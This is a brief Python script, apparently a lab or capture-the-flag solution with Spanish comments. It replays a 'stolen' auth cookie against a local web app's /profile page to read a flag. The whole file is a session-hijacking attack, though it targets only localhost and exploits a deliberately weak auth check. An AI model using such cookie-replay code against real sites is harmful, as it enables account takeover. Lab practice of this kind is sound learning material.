#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza
#______________________________________________________________________________________________________________________

import requests

# Cookie robada (cambia esto por la cookie que capturaste)
stolen_cookie = "auth=true"  # Cambia esto por la cookie que copiaste

# Función para usar la cookie robada y obtener la flag
def use_stolen_cookie():
    if not stolen_cookie:
        print("[-] No se ha capturado ninguna cookie.")
        return
    
    print("[*] Usando la cookie robada para acceder al perfil...")
    
    # Configurar la cookie en una solicitud HTTP
    cookies = {
        'auth': 'true'  # Solo el valor de la cookie
    }
    
    try:
        # Hacer una solicitud a la página de perfil
        response = requests.get("http://localhost:5000/profile", cookies=cookies)
        
        if response.status_code == 200:
            print("[+] Sesión abierta con éxito.")
            print("[+] Contenido de la página de perfil:")
            print(response.text)  # Aquí se mostrará la flag
        else:
            print(f"[-] Error al abrir sesión con la cookie robada. Código de estado: {response.status_code}")
            print(f"[-] Respuesta del servidor: {response.text}")  # Imprime la respuesta del servidor para debug
    except requests.exceptions.RequestException as e:
        print(f"[-] Error de conexión: {e}")

if __name__ == '__main__':
    use_stolen_cookie()